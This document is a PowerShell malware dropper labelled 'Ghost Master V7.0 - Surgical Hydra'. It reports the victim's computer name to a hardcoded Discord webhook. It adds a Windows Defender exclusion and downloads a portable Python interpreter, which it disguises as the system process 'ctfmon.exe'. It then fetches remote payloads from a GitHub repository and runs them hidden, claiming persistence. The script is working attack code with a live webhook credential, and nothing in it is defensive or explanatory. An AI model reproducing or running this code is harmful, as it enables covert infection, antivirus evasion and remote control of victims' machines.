# --- THE FINAL GHOST MASTER (V7.0 - SURGICAL HYDRA) ---
$WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
function Send-Ghost { param($msg) try { $json = @{content="**[GHOST STATUS | $($env:COMPUTERNAME)]** $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

# Force TLS 1.2 for Discord and Python downloads
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$ID = "svchost"
$Path = "$env:APPDATA\$ID"
$PY_MASK = "$Path\python\ctfmon.exe"

# Prevent duplicate execution
if (Get-Process -Name "ctfmon" | Where-Object { $_.Path -like "*$Path*" }) { exit }

# Create work dir and set Defender exclusion
if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 1. LANDING PORTABLE PYTHON
if (!(Test-Path $PY_MASK)) {
    Send-Ghost "Landing Private Engine (60MB)..."
    $zip = "$Path\py.zip"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip" -OutFile $zip
    
    # Surgical Extraction (Uses native Shell.Application - much more stable than Expand-Archive)
    if (!(Test-Path "$Path\python")) { New-Item -ItemType Directory -Path "$Path\python" -Force }
    $shell = New-Object -ComObject Shell.Application
    $zipFile = $shell.NameSpace($zip)
    $dest = $shell.NameSpace("$Path\python")
    $dest.CopyHere($zipFile.Items(), 0x10) # 0x10 = Respond "Yes to All"
    
    Remove-Item $zip -ErrorAction SilentlyContinue
    
    # Enable Site-Packages for imports
    $PthFile = Get-ChildItem -Path "$Path\python" -Filter "*._pth" | Select-Object -First 1
    if ($PthFile) {
        $Content = Get-Content $PthFile.FullName
        $Content = $Content -replace "#import site", "import site"
        Set-Content -Path $PthFile.FullName -Value $Content
    }

    # Mask the interpreter as a system process
    if (Test-Path "$Path\python\pythonw.exe") { Rename-Item -Path "$Path\python\pythonw.exe" -NewName "ctfmon.exe" -Force }
}

# 2. LANDING PAYLOADS
Send-Ghost "Syncing Payloads from GitHub..."
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\mui_cache.bin"

# 3. ENGAGE
$env:PYTHONPATH = "$Path\python\Lib\site-packages"
Send-Ghost "Engaging Hydra Core. Monitoring active."
Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`"" -WorkingDirectory $Path -WindowStyle Hidden

Send-Ghost "Hydra Fully Online. Persistence established."
